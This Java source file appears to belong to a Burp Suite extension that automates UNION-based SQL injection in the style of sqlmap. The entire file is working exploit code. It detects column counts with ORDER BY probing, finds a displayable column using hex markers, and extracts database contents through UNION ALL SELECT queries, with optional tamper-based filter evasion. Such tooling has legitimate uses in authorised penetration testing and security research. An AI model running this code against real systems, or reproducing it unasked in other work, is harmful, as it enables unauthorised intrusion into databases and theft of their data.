package com.omnistrike.modules.exploit.omnimap.technique;

import burp.api.montoya.MontoyaApi;
import burp.api.montoya.http.message.HttpRequestResponse;
import burp.api.montoya.http.message.requests.HttpRequest;
import com.omnistrike.modules.exploit.omnimap.OmniMapCallback;
import com.omnistrike.modules.exploit.omnimap.OmniMapConfig;
import com.omnistrike.modules.exploit.omnimap.OmniMapResult;
import com.omnistrike.modules.exploit.omnimap.dbms.DbmsDialect;
import com.omnistrike.modules.exploit.omnimap.tamper.TamperEngine;

import java.util.ArrayList;
import java.util.List;
import java.util.concurrent.ThreadLocalRandom;

/**
 * UNION-based SQL injection extractor — the fastest technique.
 * Extracts entire rows per request using UNION SELECT.
 *
 * Phases:
 * 1. Detect column count via ORDER BY binary search
 * 2. Find displayable column via UNION SELECT with markers
 * 3. Extract data via UNION SELECT with subqueries
 */
public class UnionExtractor {

    private final MontoyaApi api;
    private final OmniMapConfig config;
    private final DbmsDialect dialect;
    private final OmniMapCallback callback;
    private final OmniMapResult result;
    private final HttpRequestResponse originalRequest;
    private volatile boolean cancelled = false;

    private int columnCount = -1;
    private int displayColumn = -1;
    private String baselineBody = "";
    private final ResponseAnalyzer analyzer = new ResponseAnalyzer();

    public UnionExtractor(MontoyaApi api, OmniMapConfig config, DbmsDialect dialect,
                          OmniMapCallback callback, OmniMapResult result,
                          HttpRequestResponse originalRequest) {
        this.api = api;
        this.config = config;
        this.dialect = dialect;
        this.callback = callback;
        this.result = result;
        this.originalRequest = originalRequest;
    }

    public void cancel() { this.cancelled = true; }

    /**
     * Test if UNION-based injection works and detect column count + display column.
     * @return true if UNION injection is viable
     */
    public boolean detect() {
        callback.onProgress("UNION: Detecting column count...", 5);

        // Get baseline response
        baselineBody = sendPayload("").bodyToString();

        // Phase 1: Binary search for column count via ORDER BY
        columnCount = detectColumnCount();
        if (columnCount <= 0 || cancelled) return false;

        callback.onProgress("UNION: Found " + columnCount + " columns. Finding display column...", 10);

        // Phase 2: Find which column is displayed in the response
        displayColumn = findDisplayColumn();
        if (displayColumn < 0 || cancelled) return false;

        callback.onProgress("UNION: Display column " + (displayColumn + 1) + " of " + columnCount, 15);
        return true;
    }

    /**
     * Extract data using UNION ALL SELECT (like sqlmap).
     * The query result is placed in the displayable column, wrapped in hex-encoded
     * markers. Non-display columns use NULL (not numeric values).
     */
    public String extractSingle(String query) {
        if (cancelled || columnCount <= 0 || displayColumn < 0) return null;

        // Generate random hex markers like sqlmap (e.g., 0x716b7871...data...0x7170787871)
        String startHex = randomHex(4);
        String endHex = randomHex(5);
        String startMarker = decodeHex(startHex);
        String endMarker = decodeHex(endHex);

        // Build UNION ALL SELECT: NULL for non-display columns, hex markers around data
        StringBuilder unionCols = new StringBuilder();
        for (int i = 0; i < columnCount; i++) {
            if (i > 0) unionCols.append(",");
            if (i == displayColumn) {
                unionCols.append(dialect.concatenate(startHex,
                        "(" + query + ")", endHex));
            } else {
                unionCols.append("NULL");
            }
        }

        String payload = " UNION ALL SELECT " + unionCols + " ";
        payload = applyTamper(payload);

        var response = sendPayload(payload);
        if (response == null || cancelled) return null;

        String body = response.bodyToString();
        if (body == null) return null;

        // Extract data between decoded hex markers
        int start = body.indexOf(startMarker);
        if (start < 0) return null;
        start += startMarker.length();

        int end = body.indexOf(endMarker, start);
        if (end < 0) return null;

        return body.substring(start, end);
    }

    /**
     * Extract a list of values (e.g., database names, table names).
     * Uses GROUP_CONCAT or equivalent to get all values in one request when possible.
     */
    public List<String> extractList(String query) {
        List<String> results = new ArrayList<>();
        if (cancelled) return results;

        // Try GROUP_CONCAT for MySQL (one request for all)
        if ("MySQL".equals(dialect.getName())) {
            String grouped = extractSingle("SELECT GROUP_CONCAT(" +
                    query.replaceFirst("SELECT\\s+", "") + " SEPARATOR 0x7c)");
            if (grouped != null && !grouped.isEmpty()) {
                for (String val : grouped.split("\\|")) {
                    String trimmed = val.trim();
                    if (!trimmed.isEmpty()) results.add(trimmed);
                }
                return results;
            }
        }

        // For other DBMS or if GROUP_CONCAT fails: extract row by row using dialect-aware pagination
        for (int offset = 0; offset < 200 && !cancelled; offset++) {
            String limited = dialect.limitOffset(query, 1, offset);
            String val = extractSingle(limited);
            if (val == null || val.isEmpty()) break;
            results.add(val.trim());
        }

        return results;
    }

    /**
     * Detect column count using ORDER BY binary search.
     * Faster than incrementing — O(log n) instead of O(n).
     */
    private int detectColumnCount() {
        // Binary search: find the largest N where ORDER BY N succeeds
        int low = 1, high = 50;

        // First, find upper bound
        while (!cancelled) {
            String payload = " ORDER BY " + high + " ";
            payload = applyTamper(payload);
            var resp = sendPayload(payload);
            if (resp == null) break;

            if (isOrderBySuccess(resp.bodyToString())) {
                high *= 2;
                if (high > 200) break; // Safety cap
            } else {
                break;
            }
        }

        // Binary search between low and high
        int found = -1;
        while (low <= high && !cancelled) {
            int mid = (low + high) / 2;
            String payload = " ORDER BY " + mid + " ";
            payload = applyTamper(payload);
            var resp = sendPayload(payload);
            if (resp == null) break;

            if (isOrderBySuccess(resp.bodyToString())) {
                found = mid;
                low = mid + 1;
            } else {
                high = mid - 1;
            }
        }

        return found;
    }

    /**
     * Find which column index displays data in the response.
     * Like sqlmap: uses UNION ALL SELECT with NULL columns and hex-encoded
     * markers in each position to identify the displayable column.
     */
    private int findDisplayColumn() {
        // Try each column position with a unique hex marker
        for (int col = 0; col < columnCount && !cancelled; col++) {
            String markerHex = randomHex(4);
            String markerDecoded = decodeHex(markerHex);

            StringBuilder selectCols = new StringBuilder();
            for (int i = 0; i < columnCount; i++) {
                if (i > 0) selectCols.append(",");
                if (i == col) {
                    selectCols.append(markerHex);
                } else {
                    selectCols.append("NULL");
                }
            }

            String payload = " UNION ALL SELECT " + selectCols + " ";
            payload = applyTamper(payload);

            var resp = sendPayload(payload);
            if (resp == null) continue;
            String body = resp.bodyToString();
            if (body != null && body.contains(markerDecoded)) {
                return col;
            }
        }

        return -1;
    }

    /**
     * Check if an ORDER BY response indicates success (no error).
     */
    private boolean isOrderBySuccess(String body) {
        if (body == null) return false;
        // Check for common error indicators
        if (body.contains("Unknown column") || body.contains("ORDER BY position")
                || body.contains("order clause") || body.contains("does not exist")) {
            return false;
        }
        // Compare similarity to baseline (success should look like baseline)
        return analyzer.similarity(baselineBody, body) > 0.85;
    }

    /**
     * Send a request with the payload injected into the target parameter.
     */
    private burp.api.montoya.http.message.responses.HttpResponse sendPayload(String payload) {
        try {
            HttpRequest req = injectPayload(originalRequest.request(), payload);
            long start = System.currentTimeMillis();
            HttpRequestResponse rr = api.http().sendRequest(req);
            long elapsed = System.currentTimeMillis() - start;
            result.incrementRequestCount();
            callback.onRequestSent(rr, payload, "UNION", elapsed);
            return rr.response();
        } catch (Exception e) {
            return null;
        }
    }

    /**
     * Inject payload into the configured parameter.
     */
    private HttpRequest injectPayload(HttpRequest request, String payload) {
        String paramName = config.getParameterName();
        String paramType = config.getParameterType();

        String fullPayload = config.getPrefix() + payload;
        if (!config.getSuffix().isEmpty()) {
            fullPayload += config.getSuffix();
        }

        return PayloadInjector.inject(request, paramName, paramType, fullPayload);
    }

    private String applyTamper(String payload) {
        return TamperEngine.apply(payload, config.getTampers());
    }

    /**
     * Generate a random hex string like sqlmap's kb.chars markers.
     * Uses printable ASCII chars in the 0x71-0x78 range.
     */
    private static String randomHex(int byteCount) {
        StringBuilder sb = new StringBuilder("0x");
        ThreadLocalRandom rng = ThreadLocalRandom.current();
        for (int i = 0; i < byteCount; i++) {
            sb.append(String.format("%02x", rng.nextInt(0x71, 0x79)));
        }
        return sb.toString();
    }

    /**
     * Decode a hex string (0x7172...) to its ASCII string representation.
     */
    private static String decodeHex(String hex) {
        String raw = hex.startsWith("0x") ? hex.substring(2) : hex;
        StringBuilder sb = new StringBuilder();
        for (int i = 0; i < raw.length(); i += 2) {
            sb.append((char) Integer.parseInt(raw.substring(i, i + 2), 16));
        }
        return sb.toString();
    }

    public int getColumnCount() { return columnCount; }
    public int getDisplayColumn() { return displayColumn; }
}
